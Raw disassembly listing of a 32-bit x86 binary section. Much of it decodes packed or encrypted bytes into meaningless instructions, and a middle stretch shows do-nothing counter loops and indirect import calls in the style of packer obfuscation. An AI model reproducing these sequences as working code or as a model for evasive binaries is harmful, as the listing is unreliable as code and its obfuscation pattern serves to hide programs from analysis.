  401803:	xor    ecx,DWORD PTR [esi+0x35d8cc37]
  401809:	inc    edx
  40180a:	push   DWORD PTR [ebp-0x8c76b12]
  401810:	jmp    0x40183e
  401812:	dec    edx
  401813:	cmp    BYTE PTR [edx-0x25],cl
  401816:	stos   BYTE PTR es:[edi],al
  401817:	mov    dh,0xe6
  401819:	sbb    cl,BYTE PTR [esi+0x46d67c3a]
  40181f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401820:	dec    edx
  401821:	add    eax,DWORD PTR [eax]
  401823:	adc    edx,eax
  401825:	out    0x65,al
  401827:	or     al,0x6b
  401829:	mov    dl,0x9d
  40182b:	xor    al,0x23
  40182d:	push   edi
  40182e:	lods   eax,DWORD PTR ds:[esi]
  40182f:	retf   
  401830:	icebp  
  401831:	(bad)  
  401832:	das    
  401833:	fs push ss
  401835:	aaa    
  401836:	cmp    BYTE PTR [edi+0x4],al
  401839:	jo     0x4017e4
  40183b:	cmp    esi,DWORD PTR [ecx]
  40183d:	es out 0x90,al
  401840:	sbb    DWORD PTR [eax],ebp
  401842:	inc    ax
  401844:	and    BYTE PTR [ebx],0xdf
  401847:	sub    eax,0x1843b96
  40184c:	push   ds
  40184d:	call   0xf18d:0xec625ce3
  401854:	nop
  401855:	and    edx,DWORD PTR ds:0xccdcd76a
  40185b:	xor    DWORD PTR [esi-0x26ede27e],0xb8ae7fab
  401865:	mov    ecx,0x960ef18d
  40186a:	ss sahf 
  40186c:	sar    DWORD PTR [ebp*1-0x57810dd1],1
  401873:	xchg   edi,eax
  401874:	cmp    bl,BYTE PTR [edx]
  401876:	or     BYTE PTR [eax+0x3a],cl
  401879:	adc    eax,DWORD PTR [eax+0x7e]
  40187c:	leave  
  40187d:	lods   eax,DWORD PTR ds:[esi]
  40187e:	xlat   BYTE PTR ds:[ebx]
  40187f:	push   ds
  401880:	fistp  QWORD PTR [ebp+0x7d]
  401883:	xor    al,0xd
  401885:	push   ebp
  401886:	aam    0x82
  401888:	jne    0x4018c4
  40188a:	pop    edx
  40188b:	sub    BYTE PTR [edx+0x34411f64],dh
  401891:	xchg   ebx,eax
  401892:	dec    ebx
  401893:	(bad)  
  401894:	imul   edx,DWORD PTR [eax],0xffffffc9
  401897:	je     0x4018b3
  401899:	clc    
  40189a:	pop    edx
  40189b:	pop    eax
  40189c:	push   es
  40189d:	xor    cl,BYTE PTR [eax]
  40189f:	ja     0x4018c6
  4018a1:	in     al,dx
  4018a2:	inc    ecx
  4018a3:	mov    cl,0x45
  4018a5:	dec    ecx
  4018a6:	inc    edx
  4018a7:	ret    0x988f
  4018aa:	loop   0x401914
  4018ac:	jne    0x4018bb
  4018ae:	pushf  
  4018af:	aad    0xf8
  4018b1:	inc    ecx
  4018b2:	push   esp
  4018b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018b4:	ins    BYTE PTR es:[edi],dx
  4018b5:	rol    DWORD PTR [ebx],cl
  4018b7:	jae    0x4018e1
  4018b9:	cs sahf 
  4018bb:	or     ebp,edx
  4018bd:	or     eax,DWORD PTR [ebx]
  4018bf:	mov    DWORD PTR [ecx+0x4338b725],0x0
  4018c9:	add    cl,ch
  4018cb:	or     eax,0x8b000000
  4018d0:	sbb    eax,0x4338b7
  4018d5:	inc    ebx
  4018d6:	mov    DWORD PTR ds:0x4338b7,ebx
  4018dc:	cmp    DWORD PTR ds:0x4338b7,0x1c
  4018e3:	jae    0x401910
  4018e9:	cmp    DWORD PTR ds:0x4338b7,0x23
  4018f0:	jne    0x401901
  4018f6:	push   0x6ff2
  4018fb:	call   DWORD PTR ds:0x41228c
  401901:	jmp    0x4018cf
  401906:	mov    DWORD PTR ds:0x4338ab,0x436b
  401910:	mov    DWORD PTR [ebp-0x38],eax
  401913:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40191a:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401921:	or     DWORD PTR ds:0x4337f7,edx
  401927:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40192e:	add    eax,DWORD PTR ds:0x4337eb
  401934:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40193b:	xor    DWORD PTR ds:0x4338af,ecx
  401941:	mov    eax,DWORD PTR [ebp-0x10]
  401944:	xor    ebx,DWORD PTR ds:0x433873
  40194a:	xor    eax,esi
  40194c:	add    eax,edi
  40194e:	mov    DWORD PTR [ebp-0xc],eax
  401951:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401958:	sbb    ebx,ebx
  40195a:	mov    BYTE PTR [ebp-0x11],0x67
  40195e:	sub    DWORD PTR ds:0x4337e7,0x1011
  401968:	mov    eax,DWORD PTR [ebp-0x10]
  40196b:	xor    eax,esi
  40196d:	add    eax,edi
  40196f:	sbb    DWORD PTR ds:0x4337b3,0x6b1e
  401979:	mov    DWORD PTR [ebp-0xc],eax
  40197c:	mov    eax,DWORD PTR [ebp-0x3c]
  40197f:	xor    eax,esi
  401981:	xor    DWORD PTR ds:0x4337ef,0x46ad
  40198b:	add    eax,edi
  40198d:	mov    DWORD PTR [ebp-0x34],eax
  401990:	mov    eax,DWORD PTR [ebp-0x44]
  401993:	mov    DWORD PTR ds:0x4337e7,0x12
  40199d:	cmp    DWORD PTR ds:0x4337e7,0x0
  4019a4:	je     0x4019f8
  4019aa:	cmp    DWORD PTR ds:0x4337e7,0x7
  4019b1:	jne    0x4019c2
  4019b7:	push   0x4338e7
  4019bc:	call   DWORD PTR ds:0x4121b8
  4019c2:	cmp    DWORD PTR ds:0x4337e7,0x8
  4019c9:	jne    0x4019dc
  4019cf:	mov    ebx,DWORD PTR ds:0x4337e7
  4019d5:	dec    ebx
  4019d6:	mov    DWORD PTR ds:0x4337e7,ebx
  4019dc:	mov    ebx,DWORD PTR ds:0x4337e7
  4019e2:	dec    ebx
  4019e3:	mov    DWORD PTR ds:0x4337e7,ebx
  4019e9:	jmp    0x40199d
  4019ee:	and    DWORD PTR ds:0x433793,0x446b
  4019f8:	xor    eax,esi
  4019fa:	add    eax,edi
  4019fc:	not    ebx
  4019fe:	mov    DWORD PTR [ebp-0x30],eax
  401a01:	sub    ebx,DWORD PTR ds:0x433877
  401a07:	mov    eax,DWORD PTR [ebp-0x28]
  401a0a:	add    ecx,ecx
  401a0c:	xor    eax,esi
  401a0e:	and    DWORD PTR ds:0x43386b,0x0
  401a18:	jmp    0x401a2a
  401a1d:	mov    ebx,DWORD PTR ds:0x43386b
  401a23:	inc    ebx
  401a24:	mov    DWORD PTR ds:0x43386b,ebx
  401a2a:	cmp    DWORD PTR ds:0x43386b,0x18
  401a31:	jae    0x401f27
  401a37:	cmp    DWORD PTR ds:0x43386b,0xa
  401a3e:	jne    0x401a4f
  401a44:	push   0x1a57
  401a49:	call   DWORD PTR ds:0x412350
  401a4f:	cmp    DWORD PTR ds:0x43386b,0x9
  401a56:	jne    0x401a6b
  401a5c:	xor    ebx,ebx
  401a5e:	xor    ebx,DWORD PTR ds:0x43386b
  401a64:	inc    ebx
  401a65:	mov    DWORD PTR ds:0x43386b,ebx
  401a6b:	jmp    0x401a1d
  401a70:	mov    DWORD PTR ds:0x433797,0x13
  401a7a:	cmp    DWORD PTR ds:0x433797,0x0
  401a81:	je     0x401f27
  401a87:	cmp    DWORD PTR ds:0x433797,0xa
  401a8e:	jne    0x401a9f
  401a94:	push   0x764e
  401a99:	call   DWORD PTR ds:0x412290
  401a9f:	cmp    DWORD PTR ds:0x433797,0xb
  401aa6:	jne    0x401abb
  401aac:	xor    ecx,ecx
  401aae:	xor    ecx,DWORD PTR ds:0x433797
  401ab4:	dec    ecx
  401ab5:	mov    DWORD PTR ds:0x433797,ecx
  401abb:	mov    ecx,DWORD PTR ds:0x433797
  401ac1:	dec    ecx
  401ac2:	mov    DWORD PTR ds:0x433797,ecx
  401ac8:	jmp    0x401a7a
  401acd:	and    DWORD PTR ds:0x4337f7,0x0
  401ad7:	jmp    0x401ae9
  401adc:	mov    ecx,DWORD PTR ds:0x4337f7
  401ae2:	inc    ecx
  401ae3:	mov    DWORD PTR ds:0x4337f7,ecx
  401ae9:	cmp    DWORD PTR ds:0x4337f7,0x1c
  401af0:	jae    0x401f27
  401af6:	cmp    DWORD PTR ds:0x4337f7,0x1d
  401afd:	jne    0x401b0e
  401b03:	push   0x3c99
  401b08:	call   DWORD PTR ds:0x412294
  401b0e:	jmp    0x401adc
  401b13:	xor    DWORD PTR ds:0x4337f7,ecx
  401b19:	jmp    0x401f27
  401b1e:	mov    cl,0x40
  401b20:	(bad)  
  401b21:	mul    DWORD PTR es:[ecx+0x73ea5171]
  401b28:	cmp    edx,DWORD PTR [ebx-0x3b]
  401b2b:	sbb    al,0xf6
  401b2d:	or     bl,BYTE PTR [ecx+edi*2+0x7e]
  401b31:	jle    0x401ba2
  401b33:	jge    0x401bb3
  401b35:	jle    0x401ab9
  401b37:	dec    ecx
  401b38:	mov    ebp,0x8ad1b8c4
  401b3d:	fcmovbe st,st(0)
  401b3f:	std    
  401b40:	mov    bl,0x41
  401b42:	test   BYTE PTR [esi+ebp*1],al
  401b45:	push   esi
  401b46:	mov    ebp,0xcde92e3b
  401b4b:	fwait
  401b4c:	retf   
  401b4d:	xchg   edi,eax
  401b4e:	and    BYTE PTR [ebx],cl
  401b50:	ret    0x2578
  401b53:	mov    bl,0xfd
  401b55:	daa    
  401b56:	xor    BYTE PTR [ebx-0x32c77c27],dl
  401b5c:	mov    ecx,DWORD PTR [edi+0x40256973]
  401b62:	push   eax
  401b63:	mov    dh,0x4f
  401b65:	inc    edi
  401b66:	cwde   
  401b67:	dec    edx
  401b68:	data16 out dx,al
  401b6a:	cmp    al,0x68
  401b6c:	in     eax,dx
  401b6d:	aaa    
  401b6e:	repnz imul ebp,DWORD PTR [edi-0x1b],0xffffffdb
  401b73:	add    al,0x5
  401b75:	bound  edi,QWORD PTR [ecx-0x37]
  401b78:	retf   
  401b79:	sub    eax,0x8689552c
  401b7e:	outs   dx,DWORD PTR ds:[esi]
  401b7f:	mov    bh,0x77
  401b81:	inc    ecx
  401b82:	out    0x16,al
  401b84:	pop    ss
  401b85:	mov    bl,0xbc
  401b87:	jb     0x401b28
  401b89:	add    al,0x1a
  401b8b:	int    0x67
  401b8d:	and    al,0x41
  401b8f:	dec    esp
  401b90:	aam    0x52
  401b92:	loope  0x401b5e
  401b94:	add    al,BYTE PTR gs:[ecx-0x3]
  401b98:	xchg   esi,eax
  401b99:	xchg   DWORD PTR [esp],ebx
  401b9c:	dec    edi
  401b9d:	sbb    al,0x9f
  401b9f:	pushf  
  401ba0:	ins    DWORD PTR es:[edi],dx
  401ba1:	js     0x401c19
  401ba3:	stos   DWORD PTR es:[edi],eax
  401ba4:	scas   al,BYTE PTR es:[edi]
  401ba5:	lahf   
  401ba6:	cmp    eax,0x1ee18b9
  401bab:	mov    al,es:0x1e731840
  401bb1:	mov    DWORD PTR [esp+edx*2],ebp
  401bb4:	ret    0xf0e2
  401bb7:	les    esi,FWORD PTR [eax]
  401bb9:	int3   
  401bba:	rcr    BYTE PTR [edx+0x44],cl
  401bbd:	dec    eax
  401bbe:	cdq    
  401bbf:	lock in eax,0x77
  401bc2:	ret    0x5f9e
  401bc5:	aam    0xca
  401bc7:	mov    ds:0xb2ffb301,al
  401bcc:	sub    eax,0xd1c90f01
  401bd1:	mov    ds:0x3e277ca2,eax
  401bd6:	jo     0x401c1c
  401bd8:	and    DWORD PTR [ecx],eax
  401bda:	fabs   
  401bdc:	fistp  WORD PTR [edi-0x66]
  401bdf:	mov    esi,eax
  401be1:	test   cl,al
  401be3:	jp     0x401c32
  401be5:	arpl   WORD PTR [ecx-0x38cd732e],ax
  401beb:	mov    cl,0x8e
  401bee:	sbb    al,0xe6
  401bf0:	xchg   esi,eax
  401bf1:	cdq    
  401bf2:	neg    DWORD PTR [edi-0x6ece9736]
  401bf8:	int3   
  401bf9:	mov    ?,edi
  401bfb:	jmp    0xf268:0x839cf195
  401c02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c04:	or     BYTE PTR [edi+edi*1-0x5c],dl
  401c08:	or     al,0xba
  401c0a:	push   ebx
  401c0b:	push   ebp
  401c0c:	(bad)  
  401c0e:	cld    
  401c0f:	(bad)  
  401c10:	aam    0x5e
  401c12:	sub    DWORD PTR [ecx+0x1d],esi
  401c15:	retf   0x4418
  401c18:	xor    ecx,DWORD PTR [eax]
  401c1a:	adc    DWORD PTR [edi+0x2da3624f],esp
  401c20:	outs   dx,BYTE PTR ds:[esi]
  401c21:	mov    bl,0x71
  401c23:	lock add edi,DWORD PTR [ecx-0x69]
  401c27:	mov    WORD PTR [ecx+0x4f9df637],cs
  401c2d:	inc    DWORD PTR [ebx-0x7973bcaa]
  401c33:	jge    0x401c48
  401c35:	xchg   esi,eax
  401c36:	push   ebx
  401c37:	ret    0xb264
  401c3a:	mov    esp,0xff280191
  401c3f:	jns    0x401c25
  401c41:	dec    edx
  401c42:	pushf  
  401c43:	mov    ecx,DWORD PTR ds:0x6e7e933a
  401c49:	add    al,0x26
  401c4c:	call   0x7b3d:0x4f00cb07
  401c53:	or     ch,BYTE PTR [eax-0x2b]
  401c56:	sub    DWORD PTR [edx-0x3be62b7f],ebp
  401c5c:	dec    eax
  401c5d:	test   DWORD PTR [edx+0x18],edi
  401c60:	push   esp
  401c61:	(bad)  
  401c62:	cmp    al,0x94
  401c64:	aad    0x24
  401c66:	push   ebp
  401c67:	ret    0x9528
  401c6a:	sub    al,0x2b
  401c6c:	mov    edx,0x64afb90
  401c71:	aam    0x1f
  401c73:	arpl   si,di
  401c75:	jmp    FWORD PTR [edi-0x73c018f6]
  401c7b:	jns    0x401c53
  401c7d:	repz test ecx,edx
  401c80:	imul   ecx,edi,0x5aae5f58
  401c86:	pop    es
  401c87:	les    edi,FWORD PTR [ecx]
  401c89:	fwait
  401c8a:	add    cl,BYTE PTR [edi]
  401c8c:	dec    edi
  401c8d:	push   0xd43d162d
  401c92:	jae    0x401c6a
  401c94:	lock pop ds
  401c96:	gs (bad) 
  401c98:	fincstp 
  401c9a:	and    al,0xaa
  401c9c:	int    0x10
  401c9e:	(bad)  
  401c9f:	nop
  401ca0:	pop    es
  401ca1:	cmp    eax,0x39ddac90
  401ca6:	jg     0x401c51
  401ca8:	xor    al,0x6e
  401caa:	xchg   ebx,eax
  401cab:	jb     0x401c32
  401cad:	adc    BYTE PTR [edx+ebp*2],ah
  401cb0:	dec    edi
  401cb1:	inc    edx
  401cb2:	and    BYTE PTR [eax],dh
  401cb4:	mov    ecx,0xdb80d83b
  401cb9:	cmp    cl,bh
  401cbb:	in     eax,dx
  401cbc:	adc    al,0x27
  401cbe:	xchg   DWORD PTR [ebp+ebx*2+0x550349ed],ebp
  401cc5:	sub    DWORD PTR [ecx],0xf233fe4e
  401ccb:	shl    DWORD PTR es:[edi-0x594ba442],cl
  401cd2:	mov    ds:0xe94b6242,al
  401cd7:	adc    al,0xf6
  401cd9:	sbb    al,0xfc
  401cdb:	jge    0x401ccf
  401cdd:	adc    dl,BYTE PTR [ebx-0x33deddc9]
  401ce3:	aam    0xd0
  401ce5:	jnp    0x401cb7
  401ce7:	jns    0x401cc8
  401ce9:	and    DWORD PTR [ecx+0x6b30d888],0x72
  401cf0:	(bad)  
  401cf1:	sbb    dl,bh
  401cf3:	or     DWORD PTR [esi],edx
  401cf5:	adc    bh,BYTE PTR [ecx]
  401cf7:	test   DWORD PTR [esi+0x1dcb646c],0x72a66234
  401d01:	adc    al,0x6f
  401d03:	mov    ?,ebp
  401d05:	mov    esp,DWORD PTR [esi-0x55]
  401d08:	daa    
  401d09:	xchg   ebp,eax
  401d0a:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  401d0c:	mov    eax,0x386ce810
  401d11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d12:	shl    cl,1
  401d14:	(bad)  [ecx-0x75]
  401d17:	add    ebp,edi
  401d19:	data16 (bad) 
  401d1b:	or     ebx,DWORD PTR [ebp+0x32]
  401d1e:	adc    al,0x3d
  401d20:	sbb    esp,DWORD PTR [ebx]
  401d22:	xchg   ebx,eax
  401d23:	mov    edi,DWORD PTR [edx-0x6a]
  401d26:	or     DWORD PTR [eax+0x9],edi
  401d29:	mov    ch,0x69
  401d2b:	in     eax,dx
  401d2c:	sbb    BYTE PTR [ecx-0x33],bl
  401d2f:	call   0xe4081f9
  401d34:	xor    DWORD PTR [ebx],0x41
  401d37:	rcl    DWORD PTR [eax-0x6c83c9ef],cl
  401d3d:	scas   eax,DWORD PTR es:[edi]
  401d3e:	add    ah,BYTE PTR [esp+esi*2-0x5c]
  401d42:	add    al,0x5d
  401d44:	and    cl,BYTE PTR [edi-0x671a2df0]
  401d4a:	dec    BYTE PTR [ecx+0x49]
  401d4d:	aas    
  401d4e:	mov    al,0x72
  401d50:	ror    DWORD PTR [ebx],cl
  401d52:	mov    eax,0x8907603e
  401d57:	cwde   
  401d58:	outs   dx,BYTE PTR ds:[esi]
  401d59:	call   FWORD PTR [ebx+0x396c0d61]
  401d5f:	sar    BYTE PTR [ebp+0x161cccd8],1
  401d65:	das    
  401d66:	mov    al,0xe5
  401d68:	cld    
  401d69:	add    dl,BYTE PTR [eax]
  401d6b:	dec    ecx
  401d6c:	test   ch,dl
  401d6e:	aam    0x77
  401d70:	sti    
  401d71:	cmovns esi,DWORD PTR [eax-0x225fb141]
  401d78:	mov    al,ds:0xf26a631e
  401d7d:	call   0xe3e8:0xf80c1467
  401d84:	inc    ecx
  401d85:	not    BYTE PTR [edx-0x2764ce8e]
  401d8b:	mov    dl,BYTE PTR [esi]
  401d8d:	fnstcw WORD PTR [eax+eax*8-0x7084ee17]
  401d94:	jle    0x401d4d
  401d96:	sub    eax,DWORD PTR [ebp+0x6690b60a]
  401d9c:	sbb    eax,0x3dfb3512
  401da1:	push   ebp
  401da2:	push   edi
  401da3:	sub    BYTE PTR [ebx+0x7ccecf0b],ch
  401da9:	and    eax,0xa544a30b
  401dae:	ret    
  401daf:	stc    
  401db0:	sub    al,0x44
  401db2:	mov    edi,0x8d82930d
  401db7:	xor    DWORD PTR [eax+0x34e6d4fc],esp
  401dbd:	pop    ebp
  401dbe:	retf   
  401dbf:	mov    eax,ds:0x47b9ad91
  401dc4:	(bad)  
  401dc5:	dec    edi
  401dc6:	inc    ebx
  401dc7:	sub    BYTE PTR [ecx],0x79
  401dca:	mov    WORD PTR [ecx+0x39],?
  401dcd:	test   al,0xfe
  401dcf:	ja     0x401d7e
  401dd1:	jmp    FWORD PTR [ecx-0x43fb861]
  401dd7:	shl    ch,cl
  401dd9:	ror    DWORD PTR [esi-0x7a14bd16],0x34
  401de0:	push   esi
  401de1:	rol    BYTE PTR ds:[esi],1
  401de4:	xchg   BYTE PTR [edx],al
  401de6:	xchg   edi,eax
  401de7:	icebp  
  401de8:	jge    0x401dab
  401dea:	jo     0x401d87
  401dec:	mov    ah,0xed
  401dee:	lods   eax,DWORD PTR ds:[esi]
  401def:	cmp    ebx,DWORD PTR [ebx-0x3bdc2c8e]
  401df5:	pop    eax
  401df6:	(bad)  
  401df7:	xor    BYTE PTR [ecx+0x59],dl
  401dfa:	rol    BYTE PTR [ebx-0x45e30f5e],1
  401e00:	add    BYTE PTR [edx-0x8],0xf5
  401e04:	xchg   ebx,eax
  401e05:	push   esi
  401e06:	add    ecx,eax
  401e08:	push   eax
  401e09:	ja     0x401e59
  401e0b:	xor    al,0x3e
  401e0d:	cwde   
  401e0e:	xor    ebp,DWORD PTR [esi-0x23]
  401e11:	es adc al,0x1b
  401e14:	test   eax,0x6b5c3620
  401e19:	out    dx,al
  401e1a:	sbb    DWORD PTR [eax],edx
  401e1c:	enter  0xe484,0x9b
  401e20:	imul   ebx,DWORD PTR [edx],0xffffffd0
  401e23:	and    DWORD PTR [eax-0x58],esi
  401e26:	js     0x401e84
  401e28:	push   ebx
  401e29:	adc    ebx,DWORD PTR [eax]
  401e2b:	mov    ecx,0xb3ced458
  401e30:	pop    esi
  401e31:	dec    edi
  401e32:	mov    dh,0xbe
  401e34:	jnp    0x401e7f
  401e36:	mov    ebx,0x109ceddf
  401e3b:	aam    0x90
  401e3d:	xor    edi,DWORD PTR [ebx-0x4f]
  401e40:	fmul   DWORD PTR [esi]
  401e42:	fisubr DWORD PTR [edi-0x4f1215c6]
  401e48:	mov    ebx,ss
  401e4a:	push   0xf7d0a9d6
  401e4f:	xchg   DWORD PTR [ebx],ecx
  401e51:	inc    esp
  401e52:	or     DWORD PTR [esi-0x21],eax
  401e55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e56:	push   eax
  401e57:	mov    es,WORD PTR [edx+0x78]
  401e5a:	sub    BYTE PTR [edi-0x38],al
  401e5d:	neg    BYTE PTR [ebp+ecx*4+0x78]
  401e61:	adc    DWORD PTR [edx+eax*8-0x26],eax
  401e65:	jne    0x401ed2
  401e67:	int    0xba
  401e69:	push   esp
  401e6a:	loop   0x401e8c
  401e6c:	rol    BYTE PTR [ebp-0x5c7e48e],1
  401e72:	dec    edx
  401e73:	sbb    ah,BYTE PTR [edx+0x4c1244d9]
  401e79:	sar    DWORD PTR [ebx+0xb],1
  401e7c:	sbb    ebx,DWORD PTR [ebx+0x44]
  401e7f:	outs   dx,DWORD PTR ds:[esi]
  401e80:	cdq    
  401e81:	mov    edx,0x60ee4711
  401e86:	retf   0x96fe
  401e89:	(bad)  
  401e8a:	daa    
  401e8b:	cwde   
  401e8c:	cld    
  401e8d:	push   eax
  401e8e:	dec    ebp
  401e8f:	and    eax,0x6b46cde9
  401e94:	pop    ebp
  401e95:	(bad)  
  401e96:	jg     0x401ed1
  401e98:	cdq    
  401e99:	inc    ebx
  401e9a:	mov    esp,0xa583e3a4
  401e9f:	xor    BYTE PTR es:[eax],0xad
  401ea3:	mov    ebx,DWORD PTR cs:[ecx-0x73fb4060]
  401eaa:	and    BYTE PTR [ecx],dh
  401eac:	xchg   bl,al
  401eae:	outs   dx,DWORD PTR ds:[esi]
  401eaf:	add    ebp,ebx
  401eb1:	mov    ds:0xc93c5f1c,eax
  401eb6:	pmaddwd mm7,QWORD PTR [ecx+ebx*1+0x3c5b66b0]
  401ebe:	stos   DWORD PTR es:[edi],eax
  401ebf:	icebp  
  401ec0:	not    BYTE PTR [esi]
  401ec2:	mov    ds:0x1ca3d8b3,eax
  401ec7:	or     DWORD PTR [esi+0x7],ebp
  401eca:	lahf   
  401ecb:	mov    ecx,0xdf012b06
  401ed0:	lods   al,BYTE PTR ds:[esi]
  401ed1:	mov    eax,ds:0xa4697a14
  401ed6:	lods   eax,DWORD PTR ds:[esi]
  401ed7:	xchg   edi,eax
  401ed8:	scas   al,BYTE PTR es:[edi]
  401ed9:	sub    ebx,DWORD PTR [ebx]
  401edb:	imul   ebx,DWORD PTR [esi-0x27],0x5e3674b6
  401ee2:	cdq    
  401ee3:	push   ebx
  401ee4:	icebp  
  401ee5:	fstp   QWORD PTR ds:0xca5402cc
  401eeb:	mov    dl,0x51
  401eed:	xor    DWORD PTR ds:[eax+0x22],0xf638112f
  401ef5:	addr16 mov esp,0xfe8b811b
  401efb:	fsub   st,st(5)
  401efd:	pop    ss
  401efe:	inc    eax
  401eff:	(bad)  
  401f01:	or     BYTE PTR [edx+ebx*4+0x77aed747],dl
  401f08:	mov    esi,0x1fe6c3f7
  401f0d:	clc    
  401f0e:	hlt    
  401f0f:	(bad)  
  401f10:	sub    ebp,DWORD PTR [edi+0x395c7eea]
  401f16:	lock pop eax
  401f18:	mov    ecx,DWORD PTR [edx-0xfbff551]
  401f1e:	or     eax,0xe98af7cd
  401f23:	iret   
  401f24:	sbb    esi,esp
  401f26:	rol    DWORD PTR [ebx],1
  401f28:	(bad)  
  401f29:	mov    ebx,DWORD PTR ds:0x43388b
  401f2f:	mov    ecx,DWORD PTR ds:0x4338d7
  401f35:	sub    ecx,ebx
  401f37:	add    ebx,DWORD PTR [ebx+ecx*1]
  401f3a:	mov    DWORD PTR [ebp-0x2c],eax
  401f3d:	mov    ebx,DWORD PTR ds:0x4338c7
  401f43:	mov    ebx,DWORD PTR [ebx]
  401f45:	xor    DWORD PTR ds:0x43379b,ebx
  401f4b:	jmp    0x402359
  401f50:	lahf   
  401f51:	in     al,dx
  401f52:	leave  
  401f53:	dec    DWORD PTR [ecx-0x65]
  401f56:	imul   ebp,esp,0xaa49c393
  401f5c:	and    al,0x4d
  401f5e:	popa   
  401f5f:	mov    DWORD PTR [ebp+0x5],ecx
  401f62:	jle    0x401fe2
  401f64:	outs   dx,DWORD PTR ds:[esi]
  401f65:	jge    0x401fe5
  401f67:	jle    0x401f34
  401f69:	test   al,0x1b
  401f6b:	xor    dh,BYTE PTR [ebx+0x4e3e5f95]
  401f71:	push   es
  401f72:	mov    al,0x5c
  401f74:	aam    0xd7
  401f76:	cmp    esp,DWORD PTR [ebx-0x3b]
  401f79:	adc    bh,0x26
  401f7c:	ficom  DWORD PTR [esi-0x41]
  401f7f:	enter  0x62e2,0x8a
  401f83:	int3   
  401f84:	xchg   ebp,eax
  401f85:	ins    BYTE PTR es:[edi],dx
  401f86:	xchg   edi,eax
  401f87:	out    0x58,al
  401f89:	(bad)  
  401f8a:	jns    0x401f88
  401f8c:	sar    DWORD PTR [edi],1
  401f8e:	mov    bh,0xc
  401f90:	add    al,0x2b
  401f92:	inc    ebp
  401f93:	xor    eax,0x5aa8c04b
  401f98:	jge    0x401fe2
  401f9a:	in     eax,0xca
  401f9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f9d:	out    0xea,eax
  401f9f:	call   0x7340f1de
  401fa4:	dec    edx
  401fa5:	fldcw  WORD PTR [ebx+0x3c]
  401fa8:	jmp    0x401fda
  401faa:	or     edx,ebx
  401fac:	ret    0x909f
  401faf:	out    dx,al
  401fb0:	out    0x9b,al
  401fb2:	outs   dx,DWORD PTR ds:[esi]
  401fb3:	mov    ebx,0xdb0e41a2
  401fb8:	sar    DWORD PTR [eax+eax*8+0x4cd22411],1
  401fbf:	mov    bl,0xf
  401fc1:	push   es
  401fc2:	imul   ebx,edi,0xe2a69d9a
  401fc8:	(bad)  
  401fc9:	push   ebx
  401fca:	lock stos BYTE PTR es:[edi],al
  401fcc:	mov    WORD PTR [esi+0x28ee1e3c],gs
  401fd2:	call   DWORD PTR [ecx+ecx*8-0x27a86868]
  401fd9:	mov    dl,0xdc
  401fdb:	stc    
  401fdc:	xor    ecx,eax
  401fde:	push   ds
  401fdf:	popa   
  401fe0:	lahf   
  401fe1:	push   edi
  401fe2:	sub    eax,0xd61a5881
  401fe7:	pop    ds
  401fe8:	xchg   edx,eax
  401fe9:	sub    ecx,edx
  401feb:	out    0xf1,eax
  401fed:	and    DWORD PTR [edx+0x57],edx
  401ff0:	jge    0x40200a
  401ff2:	mov    ecx,0xf76403c8
  401ff7:	aad    0xaa
  401ff9:	int3   
  401ffa:	aas    
  401ffb:	(bad)  
  401ffd:	mov    al,0xda
  401fff:	retf   0x8164
  402002:	inc    esp
  402003:	and    dl,bl
  402005:	push   0x49dba43b
  40200a:	push   0xffffffe0
  40200c:	(bad)  
  40200d:	retf   0x2055
  402010:	push   ss
  402011:	leave  
  402012:	mov    esi,0x3ee1ea54
  402017:	outs   dx,BYTE PTR ds:[esi]
  402018:	mov    ebx,0xe6c2a696
  40201d:	cmp    dl,ah
  40201f:	lock mov bh,0xe1
  402022:	xor    eax,0x55027e59
  402027:	sbb    ch,BYTE PTR [eax+0x11]
  40202a:	in     al,dx
  40202b:	adc    BYTE PTR [edx],al
  40202d:	dec    edx
  40202e:	mov    esi,0x591fb84
  402033:	(bad)  
  402034:	loope  0x402004
  402036:	adc    BYTE PTR [ebx],ah
  402038:	outs   dx,BYTE PTR ds:[esi]
  402039:	jg     0x401fc2
  40203b:	lahf   
  40203c:	mov    BYTE PTR [edi+ebx*1],dl
  40203f:	retf   0x55a7
  402042:	out    0x1e,eax
  402044:	out    dx,al
  402045:	mov    edi,0x72b6f77d
  40204a:	sbb    BYTE PTR [edi],ch
  40204c:	shr    eax,1
  40204e:	mov    ds:0xbf659103,eax
  402053:	and    al,0xaf
  402055:	add    al,0xc6
  402057:	fstp   QWORD PTR [bp+0xe81]
  40205c:	int    0xaf
  40205e:	xor    bl,BYTE PTR ds:0x43429c13
  402064:	add    eax,0x9a826448
  402069:	mov    edi,0x78b3daf4
  40206e:	sub    BYTE PTR [edx+edx*1-0x5bc814df],bh
  402075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402076:	pop    ds
  402077:	dec    edi
  402078:	xor    DWORD PTR [ebx+eiz*8],esp
  40207b:	sahf   
  40207c:	cmp    ah,BYTE PTR [ebx]
  40207e:	push   ecx
  40207f:	ins    DWORD PTR es:[edi],dx
  402080:	outs   dx,BYTE PTR ds:[esi]
  402081:	shl    DWORD PTR [edx-0x222ab273],cl
  402087:	cmp    eax,0x18b9fb99
  40208c:	xor    ebx,DWORD PTR [edi-0x13]
  40208f:	loop   0x4020e5
  402091:	push   cs
  402092:	nop
  402093:	int    0xf4
  402095:	mov    ecx,0xd7bd7e01
  40209a:	push   ds
  40209b:	aad    0xd8
  40209d:	stos   BYTE PTR es:[edi],al
  40209e:	test   eax,0x8d73a706
  4020a3:	ret    0xfd6f
  4020a6:	and    eax,0x4f0b0e9
  4020ab:	imul   edi,DWORD PTR [edx-0x762e585b],0xea115743
  4020b5:	rol    BYTE PTR [edi+0x504b3f5c],cl
  4020bb:	ss jo  0x402098
  4020be:	les    edi,FWORD PTR es:[ecx]
  4020c1:	test   eax,0x34927fbe
  4020c6:	push   esi
  4020c7:	xor    ebp,edi
